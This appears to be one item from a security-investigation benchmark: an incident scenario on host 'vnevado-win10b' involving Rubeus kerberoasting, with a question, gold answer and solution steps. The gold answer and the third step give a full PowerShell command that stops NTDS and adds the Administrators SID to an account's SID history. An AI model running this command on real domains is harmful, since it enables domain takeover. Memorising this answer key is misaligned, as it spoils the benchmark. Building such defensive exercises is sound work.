  "context": "A recent incident report indicates a possible use of the Rubeus kerberoasting tool on the host `vnevado-win10b`. The tool was observed requesting Kerberos tickets for an account's service principal name and possibly decrypting them to obtain credentials or performing a pass-the-ticket technique. During the course of this incident, a remote session dropped and executed a file. This activity hints at an attacker trying to move laterally or propagate. Following these events, a suspicious service was initiated, potentially by the attacker to launch malicious commands or maintain persistence.",
  "question": "What was the command used by the suspicious service that was launched?",
  "gold_answer": "powershell.exe -command \"net.exe stop ntds /y; add-addbsidhistory -samaccountname bdadmin -sidhistory \\\"s-1-5-32-544\\\" -databasepath (get-itemproperty -path registry::hklm\\system\\currentcontrolset\\services\\ntds\\parameters).\\\"dsa database file\\\" -force; net.exe start ntds\"",
  "solution_steps": [
    "The Rubeus tool was potentially used for kerberoasting activities, indicated by the presence of the process file `psexesvc.exe`.",
    "A file was dropped and executed from a remote location by the account with AadUserId `7fcf9695-68fc-4258-864d-e1e5b166c66f`, potentially indicating lateral movement or propagation attempts.",
    "A suspicious service was launched using the command line `powershell.exe -command \"net.exe stop ntds /y; add-addbsidhistory -samaccountname bdadmin -sidhistory \\\"s-1-5-32-544\\\" -databasepath (get-itemproperty -path registry::hklm\\system\\currentcontrolset\\services\\ntds\\parameters).\\\"dsa database file\\\" -force; net.exe start ntds\"` at `2024-06-27t14:34:10.5477279z`, with Process ID `3780`. This action could be used to maintain persistence or elevate privileges."
